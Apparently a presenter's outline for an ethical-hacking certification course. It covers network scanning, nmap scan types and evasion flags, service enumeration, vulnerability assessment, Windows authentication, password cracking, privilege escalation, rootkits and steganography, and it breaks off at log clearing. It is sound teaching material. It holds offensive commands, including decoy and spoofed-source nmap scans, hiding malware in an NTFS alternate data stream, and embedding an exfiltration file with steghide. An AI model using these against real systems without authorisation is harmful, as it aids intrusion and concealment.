- What are the objectives of network scanning?
    - Discover live network hosts
    - Discover OS
- What are the objectives of Port/Service scanning?
    - Discover which port/services are running on target host(s)
    - Discover versioning info about services running on target host(s)
- What are the objectives of Vulnerability scanning
    - Discover weaknesses in target hosts
        - These will be prioritized by probability of ease of exploit

**TCP Communication**
1. Recognize the 6 TCP communication flags and point out their purpose
2. Explain the process of TCP/IP communications
- What is the first thing we need to know about TCP Communications?
    - Connection oriented
    - Utilizes 6 'Control Flags'
        - 1 bit each
        - 4 flags for connection management
            - Synchronize (SYN)
            - Acknowledge (ACK)
            - Finish (FIN)
            - Reset (RST)
        - 2 flags for system instruction
            - Push (PSH)
            - Urgent (URG)
- What details do we need to know about the connection management flags?
    - SYN
        - Initiation to establish connection between hosts
        - Sequence number synchronization
    - ACK
        - Signals that host is ready to or has received data
    - FIN
        - Signals that transmission is over and connection is terminated
    - RST
        - Signals an error
            - Aborts connection
- What details do we need to know about the system instruction flags?
    - PSH
        - Controls the sending and receiving of data in buffers
            - Increases the efficiency of that process
    - URG
        - Prioritize this data
- What is the TCP 3-way handshake?
    - Proper establishment of a TCP connection
        - SYN --> SYN/ACK --> ACK --> CONNCETION ESTABLISHED!
- Is there any way to see the 3-way handshake process?
    - Wireshark

**Network Scanning Tools**
- There are a lot of network scanning tools available, but one i hear about constantly is 'nmap'. Can we start this episode with a quick rundown of nmap?
    - Look at nmap.org
    - Look at nmap help
    - Look at nmap man page
- What are are some of the other network scanning tools that we should be aware of?
    - Quick demos
        - Unicornscan
        - Masscan
        - Metasploit
        - Hping3
    - Honorable mentions
        - Solarwinds Port Scanner
        - PRTG Network Monitor 
        - OmniPeek
- How about network scanning tools that work on mobile platforms?
    - Looks at websites for 
        - Fing(https://www.fing.io)
        - Look for scanners in app stores

**Host Discovery**
1. Define host discovery and explain its function
2. List host discovery techniques
3. Describe the advantages and application of host discovery using ICMP,ARP and UDP Ping scans
4. Utilize common host discovery tools like nmap and Angry IP Scanner
5. Identify and recall common security controls used to protect organizations against ping sweep scans
- What is 'host discovery' and what is its function?
- What are the common host discovery types/techniques?
    - ICMP ECHO
    - ARP
    - UDP
- Can you show us some common tools for performing host discovery?
    - Ping
    - Angry IP Scanner
    - nmap
- Any other techniques we should be aware of?
    - ICMP Timestamp and Address Mask
        - Timestamp (-PP)
        - Address Mask (-PM)
        - SYN Ping (-PS)
        - ACK Ping (-PA)
        - Protocol Ping (-PO)
- Are there any security controls we can employ to protect us?
    - Firewall
    - IDS/IPS
    - Rate-limit hosts running more than X-number of ICMP ECHO requests
    - ACLs
    - DMZs

**Port and Service Scanning**
1. Define port and service scans
2. Describe the purpose of performing a port and service scan
3. Identify the protocols commonly employed during a port service scan
- What is a port scan? What is a service scan? How do they differ?
    - Port scan
        - Find ports that are open
    - Service scan
        - Discover the service running on the open port 
- What is the purpose of doing a port/service scan
    - Service may have vulnerability
- Are there any common ports and or services that we should be familiar with when performing port/service scans?
    - 21 : FTP
    - 22 : SSH
    - 23 : Telnet
    - 25 : SMTP
    - 53 : DNS
    - 80 : HTTP
    - 110 : POP3
    - 111 : RPC
    - 137-139 : NETBios
    - 143 : IMAP 
    - 161 : SNMP (TCP/UDP)
    - 443 : HTTPS
    - 445 : SMB/CIFS (Server Message Block / Common Internet File System)
    - 3306 : mysql
    - 8080 : Proxy
    - 6667 : irc

**Nmap: TCP Connect Scan**
1. Use nmap to perform a TCP Connect scan to enumerate ports states and service details
2. Explain the pros and cons when utilizing this type of scan
- What is a TCP Connect scan?
    - Utilizes the TCP 3-way handshake in an attempt to verify whether a port is open or closed
    - Useful for scans run by users without administrative Privilege
- Is there a way for us to see that process?( The 3-way handshake )
    - Use Wireshark to capture the 3-way handshake of the scan
- Are there any advantages and disadvantages to using this type of scan?
    - Advantage
        - Relatively certain of port state
        - No need for admin privs
    - Disadvanages
        - Noisy. prone to detection
        - Slow 
        - Slight possibility of crashing services
    
**Nmap: TCP Stealth Scan**
1. Use nmap to perform a TCP Stealth scan to enumerate ports states and service details
2. Explain the pros and cons when utilizing this type of scan
- What is a Stealth scan?
    - AKA SYN Scan and Half-Open Scan
    - Utiliize part of the TCP 3-way handshake
- Can you show us how to perform a Stealth scan with nmap?
    - Demo
- Are there any advantages and disadvantages to using this type of scan?
    - Advantages 
        - Much quieter than TCP Connect scans
        - Faster
    - Disadvanages
        - Now detectable by IDS/IPS
        - Requires admin privs

**Nmap: Inverse TCP, XMAS and Maimon Scans**
1. Use nmap to perform an Inverse TCP scan to enumerate port states and service details
2. Use nmap to perform an XMAS scan to enumerate port states and service details
3. Explain the pros and cons when utilizing these types of scans
- What is the concept behind an Inverse TCP scan? How does this work theoretically?
    - 'Hacking' TCP
        - Firewalls/IPS can block SYN packets
            - How could we get around this?
                - Probs with other flags
                    - FIN
                    - URG
                    - PSH
                    - NULL
        - OPEN port don't respond to FIN, URG, PSH or NULL
        - CLOSED ports respond with RST
- How do we perform these types of scans?
    - -sF (FIN)
    - -sN (NULL)
    - --scanflags URGACKPSHRSTSYNFIN
    - SYN/ACK probe
- How about this 'Christmas' scan thing?
    - Scans using the FINURGPSH flags
        - You could also accomplish this with 
            - --scanflags URGPSHFIN
- As of 'Christmas' scans weren't fun enough, we also need to be aware of 'Maimon' Scans?
    - Basically thesame trick, but with different flags
        - FIN/ACK probe
            - -sM
            - --scanflags ACKFIN
- Are there any issues with using these scans that we should take in to consideration?
    - Only works with BSD-Compliant Network Stacks
        - Adherence to RFC 793
            - Windows and Linux will scoff
 
**Nmap: ACK Scan**
1. Describe the process of an ACK scan
2. Use nmap to perform an ACK scan to enumerate ports states and map firewall rules
3. Explain the pros and cons when utilizing this type of scan
- Kathy
    - Used in attempt to map firewall/filtering rules for target
- How is that done?
    - Send an ACK and random sequence number
        - NO RESPONSE = filtered
        - RST = not filtered
            - Only works on RFC 793 compliant stacks
    - `nmap -sA <targetIP>`
    - I understand there are some variations to this type of scan?
        - TTL-based
            - If TTL values are lower than 64
            - `nmap -ttl 70 <targetIP>`
                - Learn target's TTL through packet inspection
                    - --packet-trace
                    - --reason
    - Window-based
        - All about the window size
            - If target returns
                - RST + Non-Zero Window = Port OPEN
                - RST + Zero Window = Port CLOSED
                    - No Response = FILTERED
                        - Can't really trust this scan as the OS may not be compliant
                            - See man nmap and search for -sW

**Nmap: IDLE/IPID Scan**
1.  Describe the process of an IDLE/IPID scan   
2. Use nmap to perform an IDLE/IPID scan to enumerate ports states and service detail
3. Explain the pros and cons when utilizing this type of scan
- Kathy (spooky episode. There be zombies!)
    - Zombie scan
    - Takes advantage of incremental IPID values
        - Used to combat fragmentation
            - We want Global rather than per-host IPID increments
- How does the process work?
    - Step 1
        - Attacker >--SYN/ACK--> Zombie
        - Attacker <----RST----< Zombie
            - IPID is 2000
    - Step 2
        - Attacker >----SYN----> Target
            - Source IP is spoofed to that of Zombie
                - Target >----RST----> Zombie
                    - OPEN port increments IPID value of Zombie to 2001
                    - CLOSED port doesn't increment Zombie IPID Value
                    - FILTERED and CLOSED output are the same
                        - RST is sent back by CLOSED ports, which are ignored by Zombie
                        - Nothing is sent back by FILTERED, which doesn't affect Zombie IPID
    - Step 3
        - Repeat Step 1
            - nmap reports port status by inspecting IPID Value
                - If IPID = 2002, then port is OPEN
                - If IPID = 2001, then port is CLOSED|FILTERED
- (Kathy): Well that sounds really...
    - (me): COOL!?...
    - (Kathy): Complicated. Enough of the talk, show us how this is done.
- Zombie Scan Demo
    - `nmap -Pn -sI 10.0.10.50 <targetIP>`
        - 10.0.10.50 is the IP of the Edutainer Printer
        - https://nmap.org/book/idlescan.htm

**Nmap: UDP Scan**
1. Describe the process of an UDP scan
2. Use nmap to Perform an UDP scan to enumerate ports states and service detail
3. Explain the pros and cons when utilizing this type of scan
- Kathy 
    - Connection-less protocol 
        - No 3-way handshake
            - Target response is different than TCP
- So how so we determine OPEN and CLOSED ports with UDP scan?
    - CLOSED
        - Terget responds with ICMP Port Unreachable message
    - OPEN
        - Terget DOESNT RESPOND!
- Time for a demo!
    - `sudo nmap -sU -p 22,69 <metasploitable-IP> --packet-trace`
        - See the SENT packets
        - See the Port Unreachable message for port 69
        - Seet the Resend to port 69
-  What are our Pros/Cons with this type of scan?
    - It's slow
    - Needs root privs
    - That said, you may catch malicious traffic of an attacker using UDP

**Nmap: SCTP INIT and COOKIE ECHO Scans**
1. Describe the process of an SCTP INIT and COOKIE ECHO scans
2. Describe the process of an SCTP INIT and COOKIE ECHO scans
3. Explain the pros and cons when utilizing these types of scans
NOTES for DANIEL
Can run an SCTP server with NCAT using --sctp switch
Capture SCTP traffic with Wireshark for demo
- Kathy
    - How SCTP works (4-way handshake)
        - Host1 >----INIT-----> Host2
        - Host1 <--INIT-ACK---< Host2
        - Host1 >-COOKIE-ECHO-> Host2
        - Host1 <-COOKIE-ACK--< Host2
- Now that we have the basics down, tell us about the INIT scan.
    - -sY option
    - Attacker >----INIT-Chunk----> Target
    - Attacker <--INIT+ACK-Chunk--< Target
        - Port is OPEN
    - Attacker >----INIT-Chunk----> Target
    - Attacker <---ABORT-Chunk----< Target
        - Port is CLOSED
        - Port is FILTERED if
            - No response
            - ICMP Unreachable
- COOKIE ECHO scan
    - -sZ option
        - "Stealthy"
            - Some non-stateful firewalls can't block
                - Advanced IDS/IPS can detect
            - Sends COOKIE ECHO Chunk to target
                - Target doesn't respond
                    - Port is OPEN
                - Target responds with ABORT Chunk
                    - Port is CLOSE

**Nmap: IPv6 and Version Scans**
1. Describe the process of an IPv6, List and Version scans
2. Use nmap to perform an IPv6, List and Version scans to enumerate ports states and service detail
3. Explain the pros and cons when utilizing these types of scans
    - IPv6 scans
        - -6 option
        - Many devices are running IPv6 by default
        - Many aren't filtering IPv6 traffic
    - Version scanning
        - -sV 
        - Version info can lead to
            - Vulnerability Discovery
            - Exploitation

**Nmap Scan Optimizations**
1. Customize nmap scan attributes in order to optimize or reduce scan completion times
2. List common techniques for increasing scan efficiency
- Define what we mean when we say 'Optimized'
    - Running scans that we need to run
    - Not running scans that we don't need to run
    - Running scans as fast as possible
- How do we determine what scans we do/don't need to run?
    - Usually a 'reductionist' model
        - Start by casting the widest net, then increase focus
- Can you show us what that would look like?
    - Demo (scanme.nmap.org)
        - -n
        - -Pn
        - -p
- Are there any other 'speed' tricks with nmap?
    - -T1-T5

**Terget OS Identificatio Techniques**
1. Define OS Discovery/Banner Grabbing
2. Distinguish between Active and Passive Banner Grabbing Techniques
3. Use nmap, Wireshark and Unicornscan to identify target host's operating system using verious techniques
- nmap 
    - -o
        - Don't forget IPv6(-6)
    - Services may reveal OS
        - port 445 open
            - `nmap --script smb-os-discovery.nse <targetIP>`
- unicornscan 
    - `unicornscan <targetIP> -iV`
- Countermeasures
    - Disinformation
    - Turn off banners
    - Hide file extensions

**IDS and Firewall Evasion**
1. List common network scanning IDS/Firewall evasion techniques
2. Demonstrate techniques using industry standard tools like nmap, hping3, ProxySwitcher, Tails, Whonix and VPNs
- Packet Fragmentation
    - nmap -f
- IP Address Decoy
    - `nmap -D <decoy1>, <decoy2> targetIP`
- Source IP Address Spoofing
    - `nmap -S <Spoof_IP>`
- Source Port Modification
    - Use a port that's not being filtered by the target
        - i.e. 80,53,443,3389 etc
            - `nmap -g <PORT>`
- Randomizing Hosts
    - `nmap --randomize-hosts`
- Proxy Servers
    - `nmap --proxies`
- Proxy Servers
    - `nmap --proxies`
- anonymizers
    - VPN
    - TOR
        - Tails
        - Whonix
## Module 4
**Enumeration Basics**
1. Define Enumeration 
2. List assets targeted during Enumeration process
3. List and describe Enumeration techniques
4. Recognize common ports and services targeted during Enumeration
- I have heard you using the term 'Enumeration' in many of our episodes already. Can you formally define that for us?
    - Discovering and listing target information
        - Network hosts
        - Network services
        - Network shares
        - Email addresses
        - Groups
- How is this done?
    - Brute-force
    - Guessing
    - Banners
    - Email
    - SNMP
    - Zone Transfers
    - Network sniffing
- What are a few common ports and services targeted for enumeration?
    - Could be any port/service that is discovered
    - Here are a few common
        - NetBIOS
        - SNMP: 161 (UDP)
        - LDAP: 389 (TCP/UDP)
        - HTTPs: 80,443 (TCP)
        - NTP: 123 (UDP)
        - NFS: 2049 (TCP)
        - SMTP: 25 (TCP)
        - DNS: 53 (TCP/UDP)

**NetBIOS and SMB Enumeration**
1. Name the information details that can be obtained during NetBIOS Enumeration
2. Perform NetBIOS Enumeration using the nbtstat CLI tool
3. List other common NetBIOS Enumeration tools
- NetBIOS
    - Used by Windows for
        - File sharing
        - Printer sharing
    - nbtscan (Linux)
        - -r target_IP
        - -V for more output
    - nmap 
        - `nmap -sV --script nbstat.nse target_IP`
-  SMB
    - File sharing
    - CIFS (Common Internet File System)
    - Can use TCP directly
        - Port 445
    - Can use UDP/TCP
        - UDP 137,138
        - TCP 137,139
            - NetBIOS over TCP/IP
    - Tools
        - nmap
            - `nmap -A -t4 -n -Pn -p 445 target_IP`
        - net view
            - `net view \\target_IP /ALL`
            - `net view example.com`

**SNMP Enumeration**
1. Define SNMP Enumeration
2. Identify useful information that could be gathered through SNMP Enum
3. Utilize common SNMP Enum tools like SNMP check to enumerate target info
- What is SNMP?
    - A system of communication to relay status info
        - Used for system health monitoring
            - OS independent
- SNMP basics
    - Managers
    - Agents
    - Trap
        - Informs Agent of events
    - Community String
        - Basically a password
        - Default of 'public'
            - Default of READ access
        - 'private' is another commonly used string
            - Typically set to READ/WRITE
    - Management Information Base (MIB)
        - Databasse of objects that can be managed with SNMP
    - Object Identifier (OID)
        - Indentifies the MIB objectss
- Enumeration Tools
    - onesixtyone
    - snmp-check

**LDAP Enumeration**
1. Define is LDAP and how is it used?
2. Enumerate target info with LDAP Enumeration tools
- What is LDAP and how is it used?
    - Lightweight Directory Access Protocol
        - kinda like a 'phone book' of network resource attributes
            - User names
            - Email addresses
            - Phone numbers
            - Groups
    - Uses Port 389
- So LDAP is just full of possibly usefull info, but how do we access it?
    - Windows server admins
        - Server Admin Tools
        - AD Explorer (Sysinternals)
    - 3rd-Party
    - Softerra LDAP Admin
    - idapsearch
        -ldapsearch -LLL -x -H ldap://192.168.241.200 -b '' -s base'(objectclass=*)'

**NTP Enumeration**
1. Explain the function of the NTP service
2. Describe the common attributes of the NTP service
3. Employ NTP commands and tools to reveal NTP service versioning, hostname, and IP address
- What does NTP do for us?
    - Sync time/date settings
        - Why is this important?
            - Many network services utilize time as a metric for admin/security
- What are some of the attributes of NTP that we need to be aware of?
    - UDP port 123
        -  `sudo nmap -sU -n -Pn -p 123 target_IP`
    - Maintain time within 10ms
    - Can achieve time accuracy of 200 micro seconds
- Enough of the the pleasantries, how do we enumerate NTP?
- shodan search for NTP for good target
    - ntpdate
        - `-d (debug info)`
    - ntptrace 
        - Trace NTP servers to source
            - Could help map out network resources
        - ntpdq & ntpdc
            - Trace NTP servers to source
                - Could help map out network resources
        - ntpdq & ntpdc
            - host target_IP
            - version
            - peers

**NFS Enumeration**
1. Define NFS and explain potential vulnerabilities
2. Search for and access sensitive data using NFS tools
- What is NFS?
    - Share local filesystem over network
        - Remote users can mount filesystem locally
            - Centralization of data
    - Uses TCP/UDP port 2049
- How do we check for NFS?
    - `nmap -A -T5 -n -Pn -p 2049 target_IP`
    - `rpcinfo -p target_IP`
    - `showmount -e target_IP`
    - `rpc-scan.py` (github)
- How do we access the NFS share?
    - `mkdir /tmp/NFS`
    - `sudo mount -t nfs target_IP:/path/to/share /tmp/NFS`
    - `ls /tmp/NFS`

**SMTP Enumeration**
1. Use common SMTP commands and tools to enumerate valid user accounts
2. Enumerate FTP for possible sernsitive and actionable information
- SMTP is used to send email, so how can that be leveraged for enumeration purposes?
    - Users
    - email addresses
- How?
    - SMTP server commands
        - VRFY
        - EXPN
        - RCPT TO
- How to we make use of these commands for enumeration?
    - Login directly
        - netcat
        - Telnet
    - smtp-user-enum
        - -U/-u User list / single user
        - -t Target mail server (IP)
        - -M Mode (VRFY,EXPN,RCPT TO)
- What about FTP?
    - Anonymous login?
        - If yes, is there any sensitive info that can be viewed?
            - Can anonymous upload?
    - Brute-Force login
    - Version info
        - Known vulnerabilities?
## Module 5
**Vulnerability Assessment Concepts and Resources**
1. Define vulnerability research and explain its usefulness in the VA process
2. List common resources used when conducting vulnerability research
3. Define and explain the concepts and practices of vulnerability Assessments
4. Explain the concept and application of vulnerability databases and scoring systems
- What is a Vulnerability Assessment?
    - Looking at a system to discover security weaknesses
        - Helps get ahead of potential breaches
            - Test new security controls and their effectiveness
- How do Vulnerability Assessors / Ethical Hackers stay current with contemporary vulnerabilities and exploits?
    - Vulnerability Research
        - Threat Feeds
        - Discovered Security Flaws
        - Professional Development
- How is a VA done?
    - Active and Passive scanning
        - Software
            - Nessus
            - OpenVAS
- Tell us about Vulnerability Metrics and Databases?
    - Common Vulnerability Scoring System (CVSS)
        - Multiple versions
            - 2.0, 3.0, 3.1
                - https://www.first.org/cvss/v3.0/specification-document
                - 3.0 Specs
                    - None 0.0
                    - Low 0.1 - 3.9
                    - Med 4.0 - 6.9
                    - High 7.0 - 8.9
                    - Crit 9.0 - 10.0
- Common Vulnerabilities and Exposures (CVEs)
    - https://cve.mitre.org/
    - Details about discovered vulnerabilities
- National Vulnerability Database (NVD)
    - https://nvd.nist.gov/
    - US Gov run/maintained
- Common Weakness Enumeration (CWE)
    - https://cwe.mitre.org/

**Vulnerability Management Lifecycle**
1. Define the Vulnerability Management Life-Cycle process
2. List the VMLC phases in order
3. Explain the purpose of each phase of the VMLC
- EC-Council talks about this Vulnerability Management Lifecycle (see link). Can you walk us through this and give us a little more insight?
    - https://egs.eccouncil.org/wp-content/uploads/2020/12/Risk-and-Vulnerability-Assessment-Do-You-Know-the-OtherSide.pdf
        - Pre-Assessment Phase
            - Identify Assets / Create Baseline
                - Understanding the business and its processes
                - Assets
                    - Ranking / Categorization
                    - Configurations
                - Security Controls
                - Standards
                - Policies
                - Scope
- Vulnerability Assessment Phase
    - Vulnerability Assessment Scan (what you do in this phase)
        - Physical Security
        - Security Misconfigurations
        - Run the vuln scan software
            - Selecting the correct scan type
        - Identify vulnerabilities
            - False positives & False Negatives
        - Validate vulnerabilities
        - Generate a report
- Post Assessment Phase
    - Risk Assessment
        - Categorize Risks
        - Determine Risk Likelihood and Impact
        - Determine threat level
    - Remediation
        - Recommend and prioritize mitigations
        - Root Cause Analysis
        - Implement fixes/patches/controls
        - Perform training
        - Lessons learned
- Verification
    - Rescan
- Monitoring
    - Logging
    - SIEM
    - IDS/IPS

**Vulnerability Classification**
1. List and describe the different vulnerability types discovered during VA
- Classifications
    - Misconfigurations
    - Missing Patches/Updates
    - Application Flaws (coding errors???)
    - Using Default Creds/Configs
    - Design Flaws (logic/code???)
    - Open Services
    - Buffer Overflows
    - OS Flaws

**Vulnerability Assessment Types**
1. List and describe the different Vulnerability Assessment types
- Active and Passive Assessments
    - Active scans for hosts, services, and vulnerabilities
    - Passive sniffs network for sensitive info and logged on users
- External and Internal Assessments
    - External simulates APT
    - Internal simulates Insider threats
- Host-Based and Network-Based Assessments
- Application Assessments
    - Web apps
    - Software apps
- Database Assessments
- Wireless Assessments
- Credentialed and Non-Credentialed Assessments
- Manual and Automated Assessments

**Vulnerability Assessment Models and Tools**
1. Define and describe the philosophical and tactical difference VA solution models
2. Describe the attributes of an effective VA solution
3. List and define the common types of Vulnerability Assessment tools
4. Identify the criteria for chossing a Vulnerability Assessment tools
5. Recognize industry standerd VA tools
- What types of Vulnerability Assessment Models do we need to be aware of?
    - Product-Based Methods
        - Install the VA software locally/internally
            - Won't be able to give you an 'outside-in' assessment
    - Service-Based Methods
        - 3rd-party runs scans
            - Both inside and outside assessments
                - Opens visibility into air-gapped systems
- What types of Vulnerability Assessment strategies do we need to be aware of?
    - Tree-based
        - Multiple scans are run
            - Scans are customized to the host/service/database
    - Inference-based
        - Scanner starts broad and utilizes discovered info to infer the next step
            - Find host
                - Discover protocols
                    - Enumerate open ports
                        - Enumerate service
                            - Employ known vuln against service
- What Vulnerability Assessment tools types do we need to be aware of?
    - Host-based
    - Depth assessment
        - Discovers new vulnerabilities
            - Fuzzers
    - Application-layer
        - Web app assessment
        - Database assessment
    - Mobile Assessment Tools
    - Location and Data Examination Tools
        - Network-based
            - oddly enough is only able to scan the host it's installed on 
        - Agent-based
            - Scans the local host or can scan other hosts on the network
        - Proxy scanner
            - Can scan the network from any machine on the network
        - Cluster scanner
            - Same as proxy, but can scan multiple machines at one time 
            
**Vulnerability Assessment Reports**
1. List the common attributes of a VA report
2. Define the form and function of a VA report and its attributes
- Just go over a VA report and talk about the results and report details.

## Module 6
**CEH Hacking Methodology and Goals**
1. List and describe the phases of the CEH Hacking Methodology
2. List and describe the goals of an attacker at specific phases of CEH Hacking Methodology
- What do we mean by 'Methodology'?
    - Systematized approach to reaching a goal
        - System is derived from research and observation
- What is the CEH Methodology?
    - EC-Council's system for successfully hacking a target
- Where does it fit in what we've learned so far?
    - Recon/Footprinting
    - Scanning
    - Enumeration
    - Vuln Assessment
    - System Hacking
        - Gaining Access
            - Password Cracking
            - Vulnerability Exploitation
        - Priv Esc
        - Maintaining Access
        - Clearing Logs
- What are our goals in System Hacking?
    - Gaining access
        - Bypass security controls, or finding system misconfigurations to access the target system
            - Techniques
                - Password cracking
                - Vuln Exploitation
                - Social Engineering
    - Priv Esc
        - Horizontal priv esc
        - Vertical priv esc
            - Techniques
                - Vuln Exploitation
                - Security misconfiguration
    - Execute Apps
        - aka Maintaining Access
            - Techniques
                - Malware
                - C2
                - Backdoors
    - Hiding Files
        - Data exfil
            - Techniques
                - Stego
    - Covering Tracks
        - Hide/obfuscate evidence
            - Techniques
                - Log clearing


**Windows Authentication**       
1. Explain the process used for authentication by the Security Account Manager, NTLM and Kerberos
- Windows Security Accounts Manager(SAM) Database
    - Located in the Registry
        - %SystemRoot%/system32/config/SAM
    - Stores hashed user passwords
        - LM/NTLM hashes
    - Special lock on the SAM to keep safe
        - SAM can't be copied or moved while system is running
        - It can be accessed directly from memory
- NT LAN Manager(NTLM) Authentication
    - Used to be the auth mechanism for Windoes
        - Now just there as a back-up to kerberos
    1. A user accesses a client computer and provides a 
        - Domain name
        - user name 
        - password
            - The client computer a cryptographic hash of the password
                - discards the actual password
                    - The client sends the user name to the server (in plaintext)
    2. The server generates a 16-byte random number
        - Called a 'challenge'
            - Sends it back to the client
    3. client encrypts this challenge with the hash of the user's password
        - Returns the result to the server
            - This is called the 'response'
    4. The server sends the following three items to the domain controller.
        - User Name
        - Challenge sent to the client
        - Response received from the client
    5. The domain controller users the user name to retrieve the hash of the user's password
        - It compares the encrypted challenge with the response by the client
            - If they match, authentication is successful
                - Domain Controller notifies the server
    6. The server then sends the appropriated response back to the client
- Kerberos
    -  User's client generates an authenticator and is encrypted with the User's password
        - Authenticator = info about the user + timestamp
    - Client sends the encrypted authenticator to the KDC
    - KDC looks up the username and password (also checks the timestamp)
    - KDC tries to decrypt the authenticator with the password
    - KDC sends back a TGT to client
        - TGT also timestamped and encrypted with the same key as the authenticator
    - Client decrypts the TGT with user's password key
    - Client uses TGT to access other resources
        - Client requests access to Server_A
            - TGT + Server_A Access Request
    - KDC accepts request bacause of TGT
    - KDC generates a updated ticket for Server_A access
    - Client receives new ticket and sends copy to Server_A
    - Server_A decrypts ticket with its own password

**Password Attacks: Basic Concepts**
1. Define password cracking
2. List and define the common types of password cracking attacks
3. Define and describe the different processes for programmatically attacking encrypted password
4. Review the different non-technical password stealing attacks
 - Password Cracking
     - What is password cracking
     - Types of password attacks
         - Non-Electric/non-Technical
             - Techniques
                 - Shoulder surfing
                 - Social engineering
                 - Dumpster diving
         - Online ACTIVE
             - Techniques
                 - Distionary
                 - Brute-Force
                 - Rule-Based
                 - Malware/Spyware
                 - Guessing/Defaults
                 - PTH
                 - Internal Monologue
                 - LLMNR
             - Tools
                 - Hydra
                 - Ncrack
                 - pth-toolkit
                 - Responder
         - Online: PASSIVE
             - Techniques
                 - Packet Sniffing
                 - MiTM
                 - Replay
             - Tools
                 - Ettercap
                 - Bettercap
                 - Wireshark
         - Offilne
             - Techniques
                 - Dictionary
                 - Brute-force
                 - Rule-Based
                 - Rainbow Tables
                 - Distributed Network
             - Tools
                 - John the Ripper
                 - OCL-Hashcat
                 - Ophcrack
                 - Loftcrack
                 - Cain-and-able

**Password Extraction and Cracking**
1. List common tools utilized to extract password hashes
2. Utilize password hash extraction tools to retrieve password hashes
3. Explain the process of LLMNR/NBT-NS Poisoning
4. Utilize freely available tools to execute LLMNR Poisoning attack
5. Define Password salting
6. List and Explain common password policies used to defend against password attacks
- How do we get the password hashes from target computers?
    - Post-compromise activity(Usually)
    - Windows Tools
        - pwdump7
        - fgdump
        - mimikatz
        - responder
    - Linux
        - cat
    - Web/Database attacks
        - Attacker could retrieve hashes from insecure web app
    - How do we crack these hashes to reveal the passwords?
        - John the Ripper
            - Dictionary
            - Ruler
        - OCL-Hashcat
            - Brute
        - Ophcrack
            - Rainbow Tables
        - Pass-the-hash
            - Don't even need to crack the hash
            - Some systems will just use the hash
        - Any good countermeasures?
            - Good password policies
                - Sufficient length
                - Sufficient character sets
                - No dictionary words
                - Salt
        - Any other ways to grab passwords
            - Key loggers
                - Software-based
                - Hardware-based


**Password Cracking Enhancement Techniques**
1. Enhance password cracking attack efforts by utilizing techniques such as Combinator, PRINCE, Toggle-Case and Markov-Chain Attacks
- Combinator
    - Combine 2 or more dictionaries together
- PRINCE
    - Probability Infinite Chained Elements
        - Like a Combinator approach axcept
            - Only uses 1 dictionary
    - Create a usefull dictionary based on known criteria
        - Example: Passwords must be 6 chars long
            - Use only 6+ char words in dictionary
            - Create 6+ char words using combinations of smaller words
                - 2 char words +4 char words = 6 char words
- Toggle-case
    - Try every case possibility
        - aaa, aaA, aAA, AAA, AAa, Aaa
- Markov Chain
    - A statistical analysis of the passwords cracked through normal means
        - A file is generated with the most common elements
            - 'C' is the most common letter and is most commonly followed by 'a'
            - It then uses those stats to perform a dictionary/brute-force hybrid attack

**Exploitation: Buffer Overflows**
1. Summarize the concepts of a Buffer Overflow
2. List common tools and techniques used in Buffer Overflow exploit  development
3. List common protections used to prevent Buffer Overflows
- What is a buffer overflow?
    - Improper memory space allocation
    - No bounds checking
    - Allows data allocated for one memory space to spill over into another
        - If this can be controlled, artbitrary code execution can be achieved
- What kind of tools are used to create a buffer overflow?
    - Network Sniffers
    - Debuggers
    - Programmin languages
- Walk us through a simple buffer overflow 
- How can we protect against buffer overflows?
    - DEP (Data Execution Protection)
    - ASLR (Address Space Layout Randomization)
    - Static code analysis
    - Safe coding practices

**Privilege Escalation**
1. Explain the concept and practice of Privilege Escalation
2. Define the 2 types of Privilege Escalation techniqes and tools
3. Describe common techniques used to prevent Privilege Escalation attacks
- What is privilege Escalation?
    - Horizontal Priv Esc
    - Vertical Priv Esc
- How is Priv Esc accomplished?
    - OS/Software vulnerabilities
        - exploit-db
    - OS/Software Misconfigurations
        - Weak permissions
        - DLL Hijecking
            - Robber
        - Dylib Hijacking
            - Mac OS version of DLL hijecking
    - Unattended Installations
        - unattend.xml
            - `C:\Windows\Panther\`
            - `C:\Windows\Panther\Unattend\`
            - `C:\Windows\System32\`
            - `C:\Windows\System32\sysprep\`
    - Unquoted Service Paths
    - Scheduled Tasks/Cron Jobs/plist
    - SUID/GUID
    - Sudo
- What can we do to protect against Priv Esc attacks?
    - Updates/patches
    - Careful configuration
    - SAST/DAST
    - Multi-factor Auth
    - Principal of Least Privilege
    - System hardening guides

Maintaining Access
1. Define Remote Application Execution
2. List and describe tools and techniques used by attackers to remotelly execute appliactions and maintain access to systems
3. Define NTFS Alternate Data Streams
4. Explain how ADS can be used for malicious purposes
5. Create and employ ADS
6. Defin rootkits and explain their goall
7. List and define common rootkit types
- Application Execution
    - This is really the ability to interact with the target system after compromise
        - Run system comands
            - Remote Access Trojans
                - TheFatRat
                - Pupy
                    - Keylogging
                    - Screenshots
                    - Camera access
                    - Cliboard
            - Spyware
        - Defenses?
        - Anti-malware/AV
        - Anti-keylogger software
        - Patches/Updates
- Alternate Data Streams
    - Used by attackes to hide malicious files
        - Attackes malwares to legit files
            - Doesn't change size or properties of legit file
                - Create ADS
                    - `type malware/exe > C:\file1.txt:malware.exe`
- Rootkits
    - Malware that replaces OS files/processes with malicious versions
    - Standard backdoor capabilities
        - Command and Control
        - Log wiping
        - Monitoring
            -Types
        - Boot-loader level
            - Modify/replace boot loader with malicious copy
        - Hardware/Firmware Level
            - Rootkit image is stored in firmware
        - Kernel Level
            - Malicious code installed in the kernel
            - Highest level of OS access
        - Hypervisor Level
            - Loads the target OS as a virtual machine
            - Intercepts and controls hardware calls to target OS
        - Application Level
            - Like traditional malware
            - Runs as malicious versions of software and utilizes the original software's API calls
        - Library Level
            - Hooks into high-level system calls

**Steganography**
1. Define Steganography and explain how it is used for malicious purposes 
2. List and define the different Steganographic classifications
3. Explain common Steganography types and tools
4. Explain the purpose, process and challenges of Steganalysis
5. List and define common Steganalysis methods and tools
- Today we're taking a look into Steganography and Steganalysis. It seems like this is probably a topic that many are unfamiliar with and they are related, but different, so can we start with an explanation of what steganography is?
    - Steganography is the hiding of data in the unused space of a file
        - Images
        - Audio files
        - Video files
        - Text files
            - These are called 'Cover Medium'
- So do you just somehow open a jpeg and star typing your data into it, or how does someone hide data in this way? I assume there are tools to do this?
    - stegsnow (ASCII text files)
        -  stegsnow -C -p password -m "secret message" infile.txt outfile.txt
    - steghide (image files)
        - steghide embed -ef exfil.txt -cf hacker.jpg -sf hacker2.jpg
- Now that we're aware of Steganography, let's talk about Steganalysis.
    - Steganalysis is discovering and uncovering of steg data
        - Tools
            - Steghunt
            - zsteg (on Mint)
                - zsteg cats.img

**Covering Tracks**
1. Explain the reasoning behind why an attacker clears logs
